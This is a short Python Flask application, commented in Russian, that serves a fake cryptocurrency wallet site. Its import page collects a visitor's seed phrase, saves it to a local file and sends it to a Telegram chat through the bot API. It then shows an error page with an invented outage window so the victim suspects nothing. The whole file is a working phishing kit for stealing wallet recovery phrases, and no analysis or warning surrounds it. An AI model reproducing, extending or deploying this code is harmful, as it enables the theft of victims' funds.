from flask import Flask, render_template, request
import os
import requests
from datetime import datetime, timedelta

app = Flask(__name__)

# 🔑 Твой токен и chat_id (замени на реальные значения)
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# Путь к файлу рядом с app.py
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FILE_PATH = os.path.join(BASE_DIR, "words.txt")

# Функция отправки сообщения в Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        r = requests.post(url, data=payload)
        r.raise_for_status()
    except requests.exceptions.RequestException as e:
        print("Ошибка отправки в Telegram:", e)

# Главная страница
@app.route('/')
def index():
    return render_template('index.html')

# Страница кошелька
@app.route('/wallet')
def wallet():
    return render_template('wallet.html')

# Страница ошибки (если нужна)
@app.route('/error')
def error():
    now = datetime.now()
    start = now - timedelta(hours=1)
    end = now + timedelta(hours=3)
    start_time = start.strftime("%H:%M %d.%m.%Y")
    end_time = end.strftime("%H:%M %d.%m.%Y")
    return render_template("error.html", start_time=start_time, end_time=end_time)

@app.route('/new_wallet')
def new_wallet():
    return render_template('new_wallet.html')

@app.route('/import', methods=['GET', 'POST'])
def import_wallet():
    if request.method == 'POST':
        seed_phrase = request.form.get('words')
        if seed_phrase:
            # Сохраняем фразу в файл
            with open(FILE_PATH, 'a', encoding='utf-8') as f:
                f.write(seed_phrase + '\n')

            # Отправляем в Telegram
            send_to_telegram(seed_phrase)

            # Переходим на страницу error.html после успешного ввода
            return render_template('error.html')
    return render_template('import.html')

if __name__ == '__main__':
    app.run(debug=True)
